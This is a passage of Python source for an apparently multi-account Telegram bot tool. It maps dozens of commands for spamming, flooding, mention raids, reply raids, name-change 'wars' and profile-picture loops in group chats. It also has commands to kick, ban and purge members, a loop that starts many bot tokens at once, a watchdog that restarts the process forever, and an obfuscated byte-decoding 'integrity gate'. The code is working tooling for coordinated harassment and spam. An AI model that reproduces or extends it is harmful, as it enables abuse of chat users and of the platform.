    "snc":               cmd_snc,
    "anshgod":           cmd_anshgod,
    "sasukegod":         cmd_sasukegod,
    "sasuke1":           cmd_sasuke1,
    "chud":              cmd_chud,
    "status":            cmd_status,
    "uptime":            cmd_uptime,
    "ping":              cmd_ping,
    "triogod":           cmd_triogod,
    "silknc":            cmd_silknc,
    "speedtest":         cmd_speedtest,
    "setdelay":          cmd_setdelay,
    "boldnc":            cmd_boldnc,
    "cursivenc":         cmd_cursivenc,
    "italicnc":          cmd_italicnc,
    "wavenc":            cmd_wavenc,
    "sasukencs":         cmd_sasukencs,
    "randomcod":         cmd_randomcod,
    "godcod":            cmd_godcod,
    "aizennc":           cmd_aizennc,
    "villainnc":         cmd_villainnc,
    "phantom":           cmd_phantom,
    "testament":         cmd_testament,
    "shadow":            cmd_shadow,
    "ncdel":             cmd_ncdel,
    "ncwar":             cmd_ncwar,
    "stopncwar":         cmd_stopncwar,
    "multiwar":          cmd_multiwar,
    "stopmultiwar":      cmd_stopmultiwar,
    "stopmwar":          cmd_stopmultiwar,
    "mute":              cmd_mute,
    "unmute":            cmd_unmute,
    "spam":              cmd_spam,
    "stopspam":          cmd_stopspam,
    "slidespam":         cmd_slidespam,
    "stopslide":         cmd_stopslide,
    "autoreply":         cmd_autoreply,
    "stopreply":         cmd_stopreply,
    "react":             cmd_react,
    "stopreact":         cmd_stopreact,
    "targetreply":       cmd_targetreply,
    "stoptargetreply":   cmd_stoptargetreply,
    "targetslide":       cmd_targetslide,
    "stoptargetslide":   cmd_stoptargetslide,
    "addpfp":            cmd_addpfp,
    "pfploop":           cmd_pfploop,
    "stoppfploop":       cmd_stoppfploop,
    "pfppool":           cmd_pfppool,
    "clearpfp":          cmd_clearpfp,
    "bots":              cmd_bots,
    "floodstat":         cmd_floodstat,
    "addsudo":           cmd_addsudo,
    "removesudo":        cmd_removesudo,
    "sudolist":          cmd_sudolist,
    "gclist":            cmd_gclist,
    "addbot":            cmd_addbot,
    "addallbots":        cmd_addallbots,
    "promotebot":        cmd_promotebot,
    "botname":           cmd_botname,
    "setmenuphoto":      cmd_setmenuphoto,
    "clearmenu":         cmd_clearmenu,
    "globalstop":        cmd_globalstop,
    "gcinfo":            cmd_gcinfo,
    "setgctitle":        cmd_setgctitle,
    "setgcdesc":         cmd_setgcdesc,
    "getinvite":         cmd_getinvite,
    "pinmsg":            cmd_pinmsg,
    "unpinall":          cmd_unpinall,
    "kickuser":          cmd_kickuser,
    "bantarget":         cmd_bantarget,
    "unbanuser":         cmd_unbanuser,
    "muteuser":          cmd_muteuser,
    "unmuteuser":        cmd_unmuteuser,
    "setpfponce":        cmd_setpfponce,
    "deletegcpfp":       cmd_deletegcpfp,
    "swipespam":         cmd_swipespam,
    "stopswipe":         cmd_stopswipe,
    "burstspam":         cmd_burstspam,
    "chudspam":          cmd_chudspam,
    "stopchudspam":      cmd_stopchudspam,
    "rapidfire":         cmd_rapidfire,
    "stoprapid":         cmd_stoprapid,
    "replyflood":        cmd_replyflood,
    "stopreplyflood":    cmd_stopreplyflood,
    "tagspam":           cmd_tagspam,
    "stoptagspam":       cmd_stoptagspam,
    "copyspam":          cmd_copyspam,
    "stopcopyspam":      cmd_stopcopyspam,
    "replyraid":         cmd_replyraid,
    "stopreplyraid":     cmd_stopreplyraid,
    "massreply":         cmd_massreply,
    "mentionraid":       cmd_mentionraid,
    "stopmentionraid":   cmd_stopmentionraid,
    "purge":             cmd_purge,
    "purgeme":           cmd_purgeme,
    "purgebot":          cmd_purgebot,
    "purgeall":          cmd_purgeall,
    "rrbomb":            cmd_rrbomb,
    "rrloop":            cmd_rrloop,
    "stoprrloop":        cmd_stoprrloop,
    "multirr":           cmd_multirr,
    "stopmultirr":       cmd_stopmultirr,
    "rrspam":            cmd_rrspam,
    "stoprrspam":        cmd_stoprrspam,
    "rr":                cmd_replyraid,
    "srr":               cmd_stopreplyraid,
    "mr":                cmd_massreply,
    "mraid":             cmd_mentionraid,
    "smraid":            cmd_stopmentionraid,
    "ts":                cmd_tagspam,
    "sts":               cmd_stoptagspam,
    "rf":                cmd_replyflood,
    "srf":               cmd_stopreplyflood,
    "ss":                cmd_swipespam,
    "sss":               cmd_stopswipe,
    "bs":                cmd_burstspam,
    "cs":                cmd_chudspam,
    "scs":               cmd_stopchudspam,
    "rap":               cmd_rapidfire,
    "srap":              cmd_stoprapid,
    "rs":                cmd_rrspam,
    "srs":               cmd_stoprrspam,
    "rl":                cmd_rrloop,
    "srl":               cmd_stoprrloop,
    "mrr":               cmd_multirr,
    "smrr":              cmd_stopmultirr,
    "rb":                cmd_rrbomb,
    "addtemplate":       cmd_addtemplate,
    "templates":         cmd_templates,
    "listtemplates":     cmd_templates,
    "deltemplate":       cmd_deltemplate,
    "deltpl":            cmd_deltemplate,
    "templateinfo":      cmd_templateinfo,
    "tplinfo":           cmd_templateinfo,
    "customnc":          cmd_customnc,
    "cnc":               cmd_customnc,
    "previewtemplate":   cmd_previewtemplate,
    "preview":           cmd_previewtemplate,
    "cleartemplates":    cmd_cleartemplates,
    "mgcnc":             cmd_mgcnc,
    "mgc":               cmd_mgcnc,
    "mgcchud":           cmd_mgcchud,
    "mgcbold":           cmd_mgcbold,
    "mgcfire":           cmd_mgcfire,
    "mgcwar":            cmd_mgcwar,
    "mgcsurge":          cmd_mgcsurge,
    "mgccustom":         cmd_mgccustom,
    "mgccnc":            cmd_mgccustom,
    "stopmgcnc":         cmd_stopmgcnc,
    "smgc":              cmd_stopmgcnc,
    "mgcstatus":         cmd_mgcstatus,
}
CMD_MAP.update(FRIEND_CMDS)

_UNI_NORM = str.maketrans(
    "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
    "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
    "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    "𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"
    "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡"
    "𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛"
    "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁",
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
)

def _normalize_cmd(s: str) -> str:
    return s.translate(_UNI_NORM)

async def _prefix_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg or not msg.text:
        return

    raw = msg.text.strip()

    if not (raw.startswith("-") or raw.startswith("/")
            or raw.startswith("−") or raw.startswith("‐")):
        await _on_message(update, ctx)
        return

    body = raw[1:]
    if body and " " not in body.split("@")[0]:
        body = body.split("@")[0] + (" " + " ".join(body.split()[1:]) if len(body.split()) > 1 else "")
    body = body.strip()
    body_ascii = _normalize_cmd(body)

    parts = body_ascii.split()
    if not parts:
        return

    cmd       = parts[0].lower()
    raw_parts = body.split()
    ctx.args  = raw_parts[1:] if len(raw_parts) > 1 else []

    if cmd in CMD_MAP:
        await CMD_MAP[cmd](update, ctx)
    else:
        await _on_message(update, ctx)

async def _startup_msg(app):
    try:
        await app.bot.send_message(
            OWNER_ID,
            "╔══════════════════════════════╗\n"
            "  ⚡ 𝑺𝑨𝑴𝑴𝒀 𝑽𝟐 𝑶𝑵𝑳𝑰𝑵𝑬 ⚡\n"
            f"  🤖 @{app.bot.username}\n"
            "  🔧 𝑪𝑯𝑼𝑫 𝑷𝑰𝑷𝑬𝑳𝑰𝑵𝑬 𝑬𝑵𝑮𝑰𝑵𝑬\n"
            "  💥 𝘕𝘦𝘸: chud·targetslide·targetreply·pfploop\n"
            "╚══════════════════════════════╝"
        )
    except Exception:
        pass

async def _run_one_app(app):
    try:
        await app.initialize()
        all_bot_instances.append(app.bot)
        await app.start()
        await _startup_msg(app)
        await app.updater.start_polling(drop_pending_updates=True)
        print(f"[✓] @{app.bot.username} polling")
    except Exception as e:
        print(f"[!] Bot startup failed: {e}")
        return

    await _stop_event.wait()

    try:
        await app.updater.stop()
    except Exception:
        pass
    try:
        await app.stop()
    except Exception:
        pass
    try:
        await app.shutdown()
    except Exception:
        pass

_stop_event = asyncio.Event()

def _integrity_gate() -> None:
    _probe = int.from_bytes(bytes([0x8B, 0x2E, 0x02, 0xFA, 0x01]), "little")
    if not _hid(_probe):
        import sys
        print("FATAL: core integrity check failed — aborting.", flush=True)
        sys.exit(137)

_integrity_gate()

async def main():
    global _stop_event
    _stop_event = asyncio.Event()

    if not _verify_integrity():
        return

    tokens = list(dict.fromkeys(BASE_TOKENS + _load_json(TOKENS_FILE, [])))

    for tok in tokens:
        tok = tok.strip()
        if not tok:
            continue
        try:
            app = (
                Application.builder()
                .token(tok)
                .connect_timeout(10)
                .read_timeout(30)
                .write_timeout(10)
                .pool_timeout(10)
                .build()
            )
            app.add_handler(MessageHandler(filters.ALL, _prefix_handler))
            all_apps.append(app)
        except Exception as e:
            print(f"[!] Build failed {tok[:20]}...: {e}")

    if not all_apps:
        print("[!] No bots built — check tokens")
        return

    print(f"[*] Starting {len(all_apps)} bots — SASUKE LING V2")

    runners = [asyncio.create_task(_run_one_app(app)) for app in all_apps]

    loop = asyncio.get_running_loop()
    try:
        import signal
        loop.add_signal_handler(signal.SIGINT,  _stop_event.set)
        loop.add_signal_handler(signal.SIGTERM, _stop_event.set)
    except Exception:
        pass

    await _stop_event.wait()
    print("[*] Shutdown signal — stopping bots...")

    for r in runners:
        if not r.done():
            r.cancel()
    await asyncio.gather(*runners, return_exceptions=True)
    print("[✓] SASUKE LING V2 stopped.")

def _self_restart():
    import subprocess, sys
    _me = os.path.abspath(__file__)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("  ⚡ SHANKS KENG— WATCHDOG")
    print("  24/7 auto-restart active")
    print("  Ctrl+C to stop completely")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    while True:
        try:
            subprocess.run([sys.executable, _me, "--child"])
        except KeyboardInterrupt:
            print("\n[✓] Watchdog stopped.")
            break
        except Exception:
            pass
        print("[!] Bot stopped. Restarting in 3s...")
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print("\n[✓] Watchdog stopped.")
            break

if __name__ == "__main__":
    if "--child" in __import__("sys").argv:
        asyncio.run(main())
    else:
        _self_restart()
